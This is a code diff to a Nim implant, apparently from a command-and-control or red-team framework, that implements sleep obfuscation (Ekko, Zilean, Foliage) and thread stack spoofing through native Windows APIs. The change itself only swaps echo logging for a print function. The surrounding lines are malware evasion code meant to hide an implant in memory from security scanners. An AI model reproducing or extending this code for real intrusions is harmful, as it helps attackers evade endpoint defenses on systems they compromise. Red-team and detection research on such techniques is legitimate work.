@@ -2,7 +2,7 @@ import winim/lean
 import winim/inc/tlhelp32
 import os, system, strformat
 
-import ./cfg 
+import ./[cfg, io] 
 import ../../common/[types, utils, crypto]
 
 # Different sleep obfuscation techniques, reimplemented in Nim (Ekko, Zilean, Foliage) 
@@ -115,10 +115,10 @@ proc GetRandomThreadCtx(): CONTEXT =
             if GetThreadContext(hThread, addr ctx) == 0: 
                 continue
 
-            echo fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
+            print fmt"[*] Using thread {thd32Entry.th32ThreadID} for stack spoofing."
             return ctx 
     
-    echo protect("[-] No suitable thread for stack duplication found.")
+    print protect("[-] No suitable thread for stack duplication found.")
     return ctx  
 
 #[
@@ -280,17 +280,17 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
             if status != STATUS_SUCCESS: 
                 raise newException(CatchableError, "RtlCreateTimer/NtContinue " & $status.toHex())
             
-        echo protect("[*] Sleep obfuscation start.")
+        print protect("[*] Sleep obfuscation start.")
 
         status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
 
-        echo protect("[*] Sleep obfuscation end.")
+        print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        echo protect("[-] "), err.msg
+        print protect("[-] "), err.msg
 
 
 #[
@@ -448,17 +448,17 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
             if status != STATUS_SUCCESS: 
                 raise newException(CatchableError, "RtlRegisterWait/NtContinue " & $status.toHex())
 
-        echo protect("[*] Sleep obfuscation start.")
+        print protect("[*] Sleep obfuscation start.")
 
         status = apis.NtSignalAndWaitForSingleObject(hEventStart, hEventEnd, FALSE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
 
-        echo protect("[*] Sleep obfuscation end.")
+        print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        echo protect("[-] "), err.msg
+        print protect("[-] "), err.msg
         
 
 #[
@@ -484,7 +484,7 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         status = apis.NtCreateThreadEx(addr hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), NULL, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, "NtCreateThreadEx " & $status.toHex())
-        echo fmt"[*] [{hThread.repr}] Thread created "
+        print fmt"[*] [{hThread.repr}] Thread created "
         defer: CloseHandle(hThread)
 
         ctxInit.ContextFlags = CONTEXT_FULL
@@ -559,17 +559,17 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, "NtAlertResumeThread " & $status.toHex())
 
-        echo protect("[*] Sleep obfuscation start.")
+        print protect("[*] Sleep obfuscation start.")
 
         status = apis.NtSignalAndWaitForSingleObject(hEventSync, hThread, TRUE, NULL)
         if status != STATUS_SUCCESS: 
             raise newException(CatchableError, "NtSignalAndWaitForSingleObject " & $status.toHex())
     
-        echo protect("[*] Sleep obfuscation end.")
+        print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
         sleep(sleepDelay)
-        echo protect("[-] "), err.msg
+        print protect("[-] "), err.msg
 
 # Sleep obfuscation implemented in various techniques
 proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NONE, spoofStack: var bool = true) = 
@@ -580,7 +580,7 @@ proc sleepObfuscate*(sleepDelay: int, technique: SleepObfuscationTechnique = NON
     # Initialize required API functions 
     let apis = initApis() 
 
-    echo fmt"[*] Sleepmask settings: Technique: {$technique}, Delay: {$sleepDelay}ms, Stack spoofing: {$spoofStack}"
+    print fmt"[*] Sleepmask settings: Technique: {$technique}, Delay: {$sleepDelay}ms, Stack spoofing: {$spoofStack}"
 
     var img: USTRING = USTRING(Length: 0)
     var key: USTRING = USTRING(Length: 0)
